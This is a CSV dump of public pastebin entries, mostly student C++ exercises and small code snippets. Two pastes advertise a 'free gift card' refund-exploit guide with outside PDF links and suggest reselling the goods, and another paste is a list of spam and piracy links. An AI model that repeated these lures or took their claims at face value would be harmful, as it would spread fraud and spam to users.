id,title,username,language,date,content
adPsjxVx,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Tuesday 12th of March 2024 01:04:08 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.

This is not my pastebin account and im using a random inactive one to post this.
 
PDF guide here:
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
12 March 2024















































"
DUjvxVv0,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:52:45 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int vkupno;
    int vkupno2;
    cin >> vkupno;
    vkupno2 = vkupno;
    
    int h = vkupno / 3600;
    vkupno -= h * 3600;
    
    int m = vkupno / 60;
    int s = vkupno % 60;
    
    cout << vkupno2 << "" sekundi se "" << h << "" casovi, "" << m << "" minuti i "" << s << "" sekundi"" <<endl;
    return 0;
}
// 14500
// 4h --> 4*3600 = 14400

// 100 / 60 = 1
// 40
"
ANZwvrKi,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:40:10 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int broj;
    cin >> broj;
    
    int treta_cifra = broj % 10;
    int vtora_cifra = (broj / 10) % 10;
    int prva_cifra = broj / 100;
    
    cout << ""Na brojot "" << broj << "" prvata cifra e "" << prva_cifra << "", vtorata cifra e "" << vtora_cifra << "", tretate cifra e "" << treta_cifra << endl;
    return 0;
}
"
1qAjKTwy,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:33:29 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a, b;
    cin >> a >> b;
    
    cout << ""Srednata vrednost na "" << a << "" i "" << b << "" e "" << (a + b) / 2 << endl;
    
    return 0;
}
"
a92PEkGN,Untitled,ledza228,Python,Tuesday 12th of March 2024 12:20:28 PM CDT,"VK_STR = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN0PQRSTUVWXYZO123456789+/=""


def splice(l, a, b, c):
    """""" JS's Array.prototype.splice

    var x = [1, 2, 3],
        y = x.splice(0, 2, 1337);

    eq

    x = [1, 2, 3]
    x, y = splice(x, 0, 2, 1337)
    """"""

    return l[:a] + [c] + l[a + b:], l[a:a + b]


def decode_audio_url(string, user_id):
    vals = string.split(""?extra="", 1)[1].split(""#"")

    tstr = vk_o(vals[0])
    ops_list = vk_o(vals[1]).split('\x09')[::-1]

    for op_data in ops_list:

        split_op_data = op_data.split('\x0b')
        cmd = split_op_data[0]
        if len(split_op_data) > 1:
            arg = split_op_data[1]
        else:
            arg = None

        if cmd == 'v':
            tstr = tstr[::-1]

        elif cmd == 'r':
            tstr = vk_r(tstr, arg)

        elif cmd == 'x':
            tstr = vk_xor(tstr, arg)
        elif cmd == 's':
            tstr = vk_s(tstr, arg)
        elif cmd == 'i':
            tstr = vk_i(tstr, arg, user_id)
        else:
            raise Exception(
                'Unknown decode cmd: ""{}""; Please send bugreport'.format(cmd)
            )

    return tstr


def vk_o(string):
    result = []
    index2 = 0

    for s in string:
        sym_index = VK_STR.find(s)

        if sym_index != -1:
            if index2 % 4 != 0:
                i = (i << 6) + sym_index
            else:
                i = sym_index

            if index2 % 4 != 0:
                index2 += 1
                shift = -2 * index2 & 6
                result += [chr(0xFF & (i >> shift))]
            else:
                index2 += 1

    return ''.join(result)


def vk_r(string, i):
    vk_str2 = VK_STR + VK_STR
    vk_str2_len = len(vk_str2)

    result = []

    for s in string:
        index = vk_str2.find(s)

        if index != -1:
            offset = index - int(i)

            if offset < 0:
                offset += vk_str2_len

            result += [vk_str2[offset]]
        else:
            result += [s]

    return ''.join(result)


def vk_xor(string, i):
    xor_val = ord(i[0])

    return ''.join(chr(ord(s) ^ xor_val) for s in string)


def vk_s_child(t, e):
    i = len(t)

    if not i:
        return []

    o = []
    e = int(e)

    for a in range(i - 1, -1, -1):
        e = (i * (a + 1) ^ e + a) % i
        o.append(e)

    return o[::-1]


def vk_s(t, e):
    i = len(t)

    if not i:
        return t

    o = vk_s_child(t, e)
    t = list(t)

    for a in range(1, i):
        t, y = splice(t, o[i - 1 - a], 1, t[a])
        t[a] = y[0]

    return ''.join(t)


def vk_i(t, e, user_id):
    return vk_s(t, int(e) ^ user_id)



print(decode_audio_url(""https:\/\/vk.com\/mp3\/audio_api_unavailable.mp3?extra=AhrlrfHZyw1WqMjUwvz6x184uNzbzvHFoeuWlLbdDKmWDtGXBMr4otnOCN03AwnWCO8YDgjJCK0XlKC1uxeZsJmXtM5ZrLaZCNbrAZz4CMe2DM8VqNKWCuTylY9LBhvJmxnFzunZvgu6zefrwvz0rc1XC3fmCM0VmLHOBNvmytjAthDwuODsqK94AKHxt29ys29IzgzKsha1vNPZltnvmLH5ywjPDfm4tdfiqKfPnhjtuvCUAc9YDwLHss9MC2vOmtjcz2XPr3b1wenLl25RuhbO#AqS2nJy"",
                        213818620))"
DFKBHz2U,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Tuesday 12th of March 2024 12:20:27 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense Few rather than Pastebin"
cdKP9RWn,esfsegseh,gadungw71,PHP,Tuesday 12th of March 2024 12:03:38 PM CDT,"•	https://www.charidy.com/1710221946632073709
•	https://www.charidy.com/1710222465600799148
•	https://torre.ai/2024hd1080p?r=gVRU6aYN
•	https://torre.ai/hdquality?r=0LKcrb8W
•	https://www.charidy.com/1710226992718414655
•	https://www.charidy.com/1710227264412016346
•	https://torre.ai/hdquality8?r=FpUyfBVV
•	https://torre.ai/tw2024hd1080p?r=DrNHsHg6
•	https://www.charidy.com/1710228738070324102
•	https://www.charidy.com/1710229193946692241
•	https://www.charidy.com/1710229638278946889
•	https://www.charidy.com/1710230031367370789
•	https://www.charidy.com/1710230640495011860
•	https://torre.ai/2024hd1080p0?r=PzT9asCy
•	https://torre.ai/hdbluray?r=RmUxIOKt
•	https://torre.ai/tw2024hd1080p9?r=y7eBbrBq
•	https://www.charidy.com/1710250572614981847
•	https://www.charidy.com/1710250871114127449
•	https://www.charidy.com/1710251164444254175
•	https://torre.ai/fullhdxemphimmai2024vietsubthuyetminhultrahd?r=pNHNtMRN
•	https://torre.ai/xemphimmai20244kfullvietsubphimmoi?r=4J3xndX3
•	https://torre.ai/maifullhd1080vietsubxemphimmoionline?r=w5qF3WuV
•	https://www.charidy.com/1710253331997375405
•	https://www.charidy.com/1710253544654435554
•	https://www.charidy.com/1710253727009102190
•	https://torre.ai/xemphimkungfupanda42024fullhdvietsubthuyetminhmienphi?r=PVyW6z7a
•	https://torre.ai/phimkungfupanda42024fullhdvisub4kultrahd?r=mVdnYRf1
•	https://torre.ai/fullhdxemphimkungfupanda42024vietsubthuyetminh?r=gMGH2uUJ
•	https://www.charidy.com/1710255919032712865
•	https://www.charidy.com/1710256258873884621
•	https://www.charidy.com/1710257039604162308
•	https://torre.ai/fullhdxemphimexhumaquatmotrungma2024vietsubthuyetminh?r=P6se34Op
•	https://torre.ai/xemphimexhumaquatmotrungma2024fullhdvietsubthuyetminhmienphi?r=7Zp1BVMh
•	https://torre.ai/fullhdxemphimexhumaquatmotrungma2024vietsubhighquality?r=tJNYKlzh
•	https://www.taskade.com/p/xem-phim-exhuma-quat-mo-trung-ma-2024-vietsub-full-hd-phimmoi-01HRSNF8FB92CP3Q565WG4T2B4
•	https://www.taskade.com/p/xem-phim-exhuma-quat-mo-trung-ma-bo-phim-vietsub-full-hd-thuyet-minh-01HRSNRMCGRN5YE3D2VZRAH2WK
•	https://wandering.flarum.cloud/d/48562-kejarlahkeinginanmu
•	https://click4r.com/posts/g/15094744/besarcinta
•	https://forum.webnovel.com/d/169422-taksegampangperguso
•	https://hiuderyy.hashnode.dev/perguso
•	https://gamma.app/docs/Untitled-f7wzimtxf0qcjw1
•	https://open.firstory.me/story/cltolb4pk09et01xkcv8y511r
•	https://telegra.ph/santuycuy-03-12
•	https://paste.ee/p/14RLt
•	https://start.me/w/gkYA0Q
•	https://hackmd.io/@rerewilli6/HklFVWCpa
•	https://muckrack.com/awaraer-etawaku/bio
•	https://profile.hatena.ne.jp/asdawfaw/
"
P4Hz4sFG,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Tuesday 12th of March 2024 11:54:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_267343.pdf

Working as of:
12 March 2024





















"
7L3ADgLQ,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 11:54:17 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;
 
int main() {
    int a, b, c;
    cin >> a >> b >> c;
    
    int niza[3];
    niza[0] = a;
    niza[1] = b;
    niza[2] = c;
    sort(niza, niza + 3);
    a = niza[0];
    b = niza[1];
    c = niza[2];
    
    int max_a = a, max_b = b, max_c = c;
    if(a >= 5) {
        max_a = 5;
    }
    if(b >= 5) {
        max_b = 5;
    }
    if(c >= 5) {
        max_c = 5;
    }
    int sum = max_a + max_b + max_c;
    
    if(a + sum - max_a >= b - max_b or a + sum - max_a >= c - max_c or b + sum - max_b >= c - max_c) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    return 0;
}
"
JuVmfF4j,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 11:27:45 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int n;
    cin >> n;
    
    int res = 2e9;
    for(int i = 0; i <= n; i++) {
        int d = 5 * i;
        if(d >= n) {
            if(res > i) {
                res = i;
            }
            
        }
        
        if(d <= n) {
            
            
            int s = n - d;
            s /= 10;
            
            if((n - d) % 10 != 0) {
                s++;
            }
            if(i >= s) {
                if(res > i + s) {
                    res = i + s;
                }
            }
        }
        
    }
    cout << res << endl;
    return 0;
}
"
yknjrTH2,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:58:24 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float cena;
    cin >> cena;
    
    float kolicina;
    cin >> kolicina;
    float iznos;
    cin >> iznos;
    
    float kusur = iznos - (kolicina * cena);
    cout << kusur << endl;
    return 0;
}
"
Mkjvgw5B,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:55:06 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a;
    cin >> a;
    
    float perimetar = 2 * a * 3.1415;
    float plostina = a * a * 3.1415;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
bZb9KhRr,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:53:55 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a;
    cin >> a;
    
    float perimetar = 4 * a;
    float plostina = a * a;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
3Nf7xuYf,Untitled,binarydepth,Python,Tuesday 12th of March 2024 10:53:20 AM CDT,"import os
import time

import torch
import torch.nn as nn
import torch.optim as optim
import torch.nn.utils.prune as prune

from modules import timer
from modules import initialize_util
from modules import initialize

startup_timer = timer.startup_timer
startup_timer.record(""launcher"")

initialize.imports()

initialize.check_versions()

def optimize_model(model):
    # Prune unnecessary connections from the model
    prune.l1_unstructured(model.fc1, name='weight', amount=0.5)
    # Split the model into smaller modules
    model_chunk1 = nn.Sequential(model.fc1, model.relu)
    model_chunk2 = model.fc2
    # Share parameters between layers of the model
    model.fc2.weight = nn.Parameter(model.fc1.weight.clone())
    model.fc2.bias = nn.Parameter(model.fc1.bias.clone())

def create_model(input_dim, hidden_dim, output_dim):
    # Define a simple neural network architecture
    model = SimpleNet(input_dim, hidden_dim, output_dim)
    # Optimize the model for memory usage
    optimize_model(model)
    return model

def process_prompt(prompt):
    # Process the prompt here
    pass

def webui():
    from modules.shared_cmd_options import cmd_opts

    launch_api = cmd_opts.api
    initialize.initialize()

    from modules import shared, ui_tempdir, script_callbacks, ui, progress, ui_extra_networks

    if shared.opts.clean_temp_dir_at_start:
        ui_tempdir.cleanup_tmpdr()
        startup_timer.record(""cleanup temp dir"")

    script_callbacks.before_ui_callback()
    startup_timer.record(""scripts before_ui_callback"")

    if not cmd_opts.no_gradio_queue:
        shared.demo.queue(64)

    gradio_auth_creds = list(initialize_util.get_gradio_auth_creds()) or None

    auto_launch_browser = False
    if os.getenv('SD_WEBUI_RESTARTING') != '1':
        if shared.opts.auto_launch_browser == ""Remote"" or cmd_opts.autolaunch:
            auto_launch_browser = True
        elif shared.opts.auto_launch_browser == ""Local"":
            auto_launch_browser = not cmd_opts.webui_is_non_local

    app, local_url, share_url = shared.demo.launch(
        share=cmd_opts.share,
        server_name=initialize_util.gradio_server_name(),
        server_port=cmd_opts.port,
        ssl_keyfile=cmd_opts.tls_keyfile,
        ssl_certfile=cmd_opts.tls_certfile,
        ssl_verify=cmd_opts.disable_tls_verify,
        debug=cmd_opts.gradio_debug,
        auth=gradio_auth_creds,
        inbrowser=auto_launch_browser,
        prevent_thread_lock=True,
        allowed_paths=cmd_opts.gradio_allowed_path,
        app_kwargs={
            ""docs_url"": ""/docs"",
            ""redoc_url"": ""/redoc"",
        },
        root_path=f""/{cmd_opts.subpath}"" if cmd_opts.subpath else """",
    )

    startup_timer.record(""gradio launch"")

    # Remove the CORS middleware to enhance security
    app.user_middleware = [x for x in app.user_middleware if x.cls.__name__ != 'CORSMiddleware']

    initialize_util.setup_middleware(app)

    progress.setup_progress_api(app)
    ui.setup_ui_api(app)

    if launch_api:
        create_api(app)

    ui_extra_networks.add_pages_to_demo(app)

    startup_timer.record(""add APIs"")

    with startup_timer.subcategory(""app_started_callback""):
        script_callbacks.app_started_callback(shared.demo, app)

    timer.startup_record = startup_timer.dump()
    print(f""Startup time: {startup_timer.summary()}."")

    try:
        while True:
            server_command = shared.state.wait_for_server_command(timeout=5)
            if server_command:
                if server_command in (""stop"", ""restart""):
                    break
                else:
                    print(f""Unknown server command: {server_command}"")

            # Process prompt
            prompt = # Get the prompt data
            process_prompt(prompt)
    except KeyboardInterrupt:
        print('Caught KeyboardInterrupt, stopping...')
        server_command = ""stop""

    if server_command == ""stop"":
        print(""Stopping server..."")
        # If we catch a keyboard interrupt, we want to stop the server and exit.
        shared.demo.close()

    # disable auto launch webui in browser for subsequent UI Reload
    os.environ.setdefault('SD_WEBUI_RESTARTING', '1')

    print('Restarting UI...')
    shared.demo.close()
    time.sleep(0.5)
    startup_timer.reset()
    script_callbacks.app_reload_callback()
    startup_timer.record(""app reload callback"")
    script_callbacks.script_unloaded_callback()
    startup_timer.record(""scripts unloaded callback"")
    initialize.initialize_rest(reload_script_modules=True)


if __name__ == ""__main__"":
    from modules.shared_cmd_options import cmd_opts

    if cmd_opts.nowebui:
        api_only()
    else:
        webui()
"
BRFSSMaB,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:52:53 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a, b;
    cin >> a >> b;
    
    float perimetar = 2 * a + 2 * b;
    float plostina = a * b;
    
    cout << ""Perimetar e "" << perimetar << "", a plostinata e "" << plostina << endl;
    return 0;
}
"
4fz1P0KC,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:48:15 AM CDT," int a = 3, b = -18;
    
    int x = -b / a;
    cout << x << endl;"
FgRLgVSM,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:45:46 AM CDT,"int agol = 30;
    int vrv = (180 - 30) / 2;
    cout << vrv << endl;"
6wzDNzkT,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:41:44 AM CDT,"float a = 8.5;
    
    float perimetar = 4 * a;
    float plostinata = a * a;
    
    cout << ""Plostina "" << plostinata << "", perimetar "" << perimetar << endl;"
p1Wa1Apq,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:39:51 AM CDT,"float r = 2.5;
    
    float plostina = r * r * 3.1415;
    cout << ""Plostinata na krugot so radiusot r="" << r << "" iznesuva "" << plostina << endl;
    "
DsanJ60S,Cardigan,psychoticodes,HTML,Tuesday 12th of March 2024 10:37:39 AM CDT,"<link href=""https://dl.dropboxusercontent.com/scl/fi/gzgzh8s0kybo2dg3sbm8y/cardigan.css?rlkey=ba4fpsrny4z0cyam8iww63k0a&dl=0"" rel=""stylesheet""><div id=""cardigan"" style=""--width:550px;--back:#080808; --color:#ffffff;""><div class=""card"">And when I felt like I was an old <i>cardigan</i> Under someone's bed</div><div class=""digdbor""></div><div class=""carbor""></div><div class=""carbt"">You put me on and said I was your favorite</div><div class=""digan"">Seu texto vai aqui</div></div>"
wUkFD830,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:37:33 AM CDT,"    float a = 8.5, b = 3.2;
    float plostina = a * b;
    cout << ""Plostinata na pravoagolnikot so stranite a="" << a << "" i b="" << b << "" iznesuva "" << plostina << endl;
"
PSMUmKe7,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 10:33:30 AM CDT,"int kolicina = 24;
    float cena = 12.5;
    
    cout << ""kolicina"" << endl;
    cout << ""cena"" << endl;
    
    cout << kolicina << endl;
    cout << cena << endl;
    
    cout << ""kolicina="" << kolicina << "", cena="" << cena << endl;"
SBuBtXpe,recursive-fibonacci-generator-returns-list,farry,Python,Tuesday 12th of March 2024 10:24:38 AM CDT,"def fibonacci(n):
    if n==0:
        return [0]
    elif n==1:
        return [0, 1]
    else:
        f = fibonacci(n-1)
        f.append(f[-1] + f[-2])
        return f
        
print(fibonacci(16))
"
WvrWHD6w,FASM  = a * 5 – (b + c + d) / 2,dllbridge,ASM (NASM),Tuesday 12th of March 2024 10:06:16 AM CDT,"format  PE console
entry   start
include 'win32ax.inc'
include 'api\kernel32.inc'


;----------------------------------------------------------------------
section '.idata' import data readable
library kernel32, 'kernel32.dll',\
        msvcrt,     'msvcrt.dll'
 
import  msvcrt,\
        printf, 'printf',\
        scanf , 'scanf'



;                                              a * 5 – (b + c + d) / 2
;----------------------------------------------------------------------
section '.data' data readable writeable

           a     dd  1
           b     dd  2
           c     dd  3
           d     dd  4
           r_1   dd  ?     ; = a * 5
           r_2   dd  ?     ; = b + c + d
           r_3   dd  ?     ; = r_2 / 2
           r_4   dd  ?     ; = r_1 - r_3     = a * 5 – (b + c + d) / 2

;----------------------------------------------------------------------
section '.code' code readable executable

start:    call Get_var

          call test_var

          mov eax, [a]      ; r_1 = a * 5
          shl eax, 2
          inc eax
          mov [r_1], eax

          mov eax  , [b]     ; r_2 * a + b + c
          add eax  , [c]
          add eax  , [d]
          mov [r_2], eax

          shr eax, 1         ; r_3 = r_2 / 2
          mov [r_3], eax


          mov eax, [r_1]     ; r-1 - r_3
          sub eax, [r_3]
          mov [r_4], eax

          call test_r_x
          cinvoke  printf, <""         "", 10, 0>
          cinvoke  printf, <""Answer:  "", 10, 0>
          cinvoke  printf, <""- - - - - - - - - - - - - - - - -"", 10, 0>
          cinvoke  printf, <""a * 5 - (b + c + d) / 2 = %d"", 10, 0>, [r_4]
          ;------------------------
          cinvoke  scanf, <""%d"", 10, 0>, 76313
          invoke   ExitProcess, 0






; Функция ожидает от пользователя ввод:  a, b, c, d
; Например, так: 1 22 3 7
;/////////////////////////////////////////////////////////////
proc    Get_var                                            ;//
 
        cinvoke  printf, <""Enter: a, b, c and d:  "", 0>

        cinvoke  scanf, <""%d%d%d%d"">, a, b, c, d
        ret
endp
 
 
 


;Процедура, которая показывает содержимое: a, b, c, d
;----------------------------------------------------------------------
test_var:   cinvoke  printf,           <10, 0>
            cinvoke  printf, <""a = %d"", 10, 0>, [a]
            cinvoke  printf, <""b = %d"", 10, 0>, [b]
            cinvoke  printf, <""c = %d"", 10, 0>, [c]
            cinvoke  printf, <""d = %d"", 10, 0>, [d]
ret                                                                    ;Возврат из процедуры

;Процедура, которая показывает содержимое: a, b, c, d
;----------------------------------------------------------------------
test_r_x:   cinvoke  printf,           <10, 0>
            cinvoke  printf, <""    a * 5 = r_1 = %d"", 10, 0>, [r_1]
            cinvoke  printf, <""b + c + d = r_2 = %d"", 10, 0>, [r_2]
            cinvoke  printf, <""  r_2 / 2 = r_3 = %d"", 10, 0>, [r_3]
            cinvoke  printf, <""r_1 - r_3 = r_4 = %d"", 10, 0>, [r_4]
ret



            "
yDsBueNk,10Million UAs and IPs,Nil000,C++,Tuesday 12th of March 2024 09:59:45 AM CDT,https://www.up-4ever.net/zhvqxboaozmo
TxFw8YEN,planes.py,puente,Python,Tuesday 12th of March 2024 09:46:56 AM CDT,"import numpy as np
import pandas as pd
from datetime import datetime, timedelta
import time

def generar_muestras(hora_inicio, n_muestras=100):
    np.random.seed(0)  # Para reproducibilidad
    tiempos_inicio = []
    tiempos_fin = []
    percentages = []
    hora_actual = datetime.strptime(hora_inicio, ""%Y-%m-%d %H:%M:%S"")


    for i in range(n_muestras):
        np.random.seed(seed=None)
        prob = np.random.random()  # Genera un número aleatorio entre 0 y 1

        start = hora_actual
        percentage = 0

        # Asigna un tiempo basado en la probabilidad
        if prob <= 0.3:
            delta = np.random.uniform(2, 3)
            percentage = 30
        elif prob <= 0.65: #probailidades agregadas
            delta = np.random.uniform(3, 4)
            percentage = 35
        elif prob <= 0.9:
            delta = np.random.uniform(4, 5)
            percentage = 25
        else:
            delta = np.random.uniform(5, 6)
            percentage = 10
        
        # Añade el delta convertido a minutos al tiempo actual
        hora_actual += timedelta(minutes=delta)

        end = hora_actual
        tiempos_inicio.append(start)
        tiempos_fin.append(end)
        percentages.append(percentage)

        time.sleep(0.1)

    return tiempos_inicio, tiempos_fin, percentages

# Genera las muestras
hora_inicio = ""2024-01-01 12:10:00""
muestras_inicio, muestras_final, porcentajes = generar_muestras(hora_inicio)

def formatear_fecha(fecha):
    return f""Day 1, {fecha.strftime('%H:%M:%S')}""

# Aplica la función de formateo a las muestras
muestras_formateadas_inicio = [formatear_fecha(fecha) for fecha in muestras_inicio]
muestras_formateadas_final = [formatear_fecha(fecha) for fecha in muestras_final]

# Convierte las muestras a un DataFrame de pandas
df = pd.DataFrame(muestras_formateadas_inicio, columns=['Starting Offset'])
df['Ending Offset'] = muestras_formateadas_final
df['Rate (events per hour)'] = porcentajes

# Guarda el DataFrame en un archivo Excel
nombre_archivo = ""./plane_arrival.xlsx""
df.to_excel(nombre_archivo, index=False)"
kd4xE1zv,WordPress: Protect custom post type with a predefined password,YordanSoares,PHP,Tuesday 12th of March 2024 09:45:05 AM CDT,"<?php
/**
 * WordPress:
 * Protect custom post type with a predefined password
 */
add_action( 'the_post', function( $post ){
	if ( $post->post_type == 'gallery' ) { // Write the custom post type ID here
		$post->post_password = 'MyP@sSW0rD'; // The predefined password goes here
	}
} );"
T4M0aeKt,Untitled,fdsafdsagdsafsda,C++,Tuesday 12th of March 2024 09:27:06 AM CDT,"#include <iostream>
#include <string.h>

typedef unsigned uint;

int main()
{
   char *tmp_str_pointer;
   char password[16] = ""12345678"";
   unsigned int some_array[8];

   std::cout<<""Enter key: "";
   std::cin>>password;
   if (strlen(password) != 8)
   {
      std::cout<<""No more""<<std::endl;
      return 0;
   }

   for (size_t i = 0; i < 8; i++)
   {
      some_array[i] = (int)password[i];
   }
   
   int iVar8 = 0;
   int local_60 = 0;
   int local_58 = 0;
   int local_50 = 0;
   int outside_index = 0;
   int inside_index = 0;
   int iVar4;
   int iVar7;
   int iVar9;
   int result = 0;
   int iVar11 = 0;
   int uVar5 = 0;
   do
   {
      iVar4 = some_array[outside_index];
      inside_index = 1;
      iVar7 = result;
      if (1 < iVar4)
      {
         do
         {
            result = iVar7;
            iVar9 = local_60;
            if ((iVar4 % inside_index == 0) &&
                ((iVar9 = local_60 + 1, (inside_index & 0xfffffffeU) != 0x3a ||
                                            (result = some_array[2], iVar9 != 3))))
            {
               if (iVar9 == 10)
               {
                  iVar11 = iVar11 + 1;
                  result = iVar7;
                  if (inside_index - 0xcU < 3)
                  {
                     local_58 = inside_index;
                  }
               }
               else if (iVar9 == 0xb)
               {
                  result = iVar7;
                  if ((inside_index - 0x12U < 3) &&
                      (local_50 = local_58 + inside_index, local_50 == 0x1e))
                  {
                     result = iVar7 + inside_index + iVar11;
                  }
               }
               else
               {
                  iVar4 = iVar11 + inside_index;
                  if (2 < local_60 - 0xbU)
                  {
                     iVar4 = iVar11;
                  }
                  iVar11 = iVar4;
                  if (iVar9 == 0x16)
                  {
                     result = iVar7 + 2 + (uint)inside_index / 5 + iVar4;
                  }
                  else
                  {
                     if (local_60 - 0x1fU < 5)
                     {
                        iVar7 = iVar7 + local_50 + inside_index;
                     }
                     local_50 = iVar8 + inside_index;
                     if (4 < local_60 - 0x1fU)
                     {
                        local_50 = iVar8;
                     }
                     uVar5 = -(uint)(4 < local_60 - 0x1fU) & local_58;
                     if (local_60 - 0x2aU < 4)
                     {
                        iVar7 = iVar7 + uVar5 + inside_index;
                     }
                     local_58 = uVar5 + inside_index;
                     if (3 < local_60 - 0x2aU)
                     {
                        local_58 = uVar5;
                     }
                     result = iVar7;
                     if ((((local_60 - 0x2eU < 4) && (local_58 == 0x73)) && (local_50 == 0x83)) &&
                         (iVar11 = iVar4 + inside_index, iVar11 == 0x93))
                     {
                        std::cout << ""already a little bit..."" << std::endl;
                        result = iVar7 + -0x93;
                     }
                  }
               }
            }
            local_60 = iVar9;
            inside_index = inside_index + 1;
            iVar4 = some_array[outside_index];
            iVar7 = result;
            iVar8 = local_50;
         } while (inside_index < iVar4);
      }
      outside_index = outside_index + 1;
   } while (outside_index < 8);

   if (result != 0x327)
   {
      std::cout << ""Wrong key :("" << std::endl;
   }
   else
   {
      std::cout << ""Good! :)"" << std::endl;
   }

   return 0;
}"
ZeJnCwgT,Custom Toast,SenpaiZero,Java,Tuesday 12th of March 2024 08:50:03 AM CDT,"private void showCustomToast_main(String message, long duration)
    {
        final TextView toastText = customCardView.findViewById(R.id.toast_text);
        toastText.setText(message);

        customCardView.setVisibility(View.VISIBLE);

        ObjectAnimator fadeOut = ObjectAnimator.ofFloat(customCardView, ""alpha"", 1f, 0f);
        fadeOut.setDuration(duration);

        fadeOut.addListener(new AnimatorListenerAdapter() {
            @Override
            public void onAnimationEnd(Animator animation) {
                super.onAnimationEnd(animation);
                customCardView.setVisibility(View.GONE);
            }
        });

        fadeOut.start();
    }"
X5fTKAYd,Transparent status bar and action bar,SenpaiZero,Java,Tuesday 12th of March 2024 08:48:50 AM CDT,"public void removeActionbar()
    {
        try
        {
            ((AppCompatActivity)activity).getSupportActionBar().hide();
        } catch (Exception ex)
        {
            try {
                activity.getActionBar().hide();
            } catch (Exception exx)
            {
                Log.e(""Action Bar"", exx.getMessage());
            }
        }
    }

    public void transparentStatusBar()
    {
        try {
            Window window = activity.getWindow();
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
            window.setStatusBarColor(Color.TRANSPARENT);
        } catch (Exception ex)
        {
            Log.e(""Transparent Status Bar"", ex.getMessage());
        }

    }"
FeMU0Xn7,Nginx playbook - 2,PandaAcademy,YAML,Tuesday 12th of March 2024 08:21:50 AM CDT,"---
- name: Install Nginx
  hosts: all
  connection: local
  become: yes
  tasks:
    - name: Update apt package index
      apt: update_cache=yes force_apt_get=yes cache_valid_time=3600


    - name: Install Nginx
      apt:
        name: nginx
        state: present

    - name: Ensure Nginx is running and enabled
      systemd:
        name: nginx
        state: started
        enabled: yes

    - name: Copy Nginx server block file
      copy:
        src: ""templates/site.conf""
        dest: ""/etc/nginx/sites-enabled/site.conf""
     register: template_result

    - name: Reload Nginx if configuration changed
      systemd:
        name: nginx
        state: reloaded
      when: template_result is changed
"
LfbYxKm2,Nginx playbook - 1,PandaAcademy,YAML,Tuesday 12th of March 2024 08:07:46 AM CDT,"---
- name: Install Nginx
  hosts: all
  connection: local
  become: yes
  tasks:
    - name: Update apt package index
      apt: update_cache=yes force_apt_get=yes cache_valid_time=3600

    - name: Install Nginx
      apt:
        name: nginx
        state: present

    - name: Ensure Nginx is running and enabled
      systemd:
        name: nginx
        state: started
        enabled: yes

    - name: Copy Nginx server block file
      copy:
        src: ""templates/site.conf""
        dest: ""/etc/nginx/sites-enabled/site.conf""

    - name: Reload Nginx if configuration changed
      systemd:
        name: nginx
        state: reloaded
"
XLPSVCaV,Review Windsor Brokers,reviewbrokers,PHP,Tuesday 12th of March 2024 08:04:59 AM CDT,https://www.reviewbrokers.net/review-windsor-brokers/
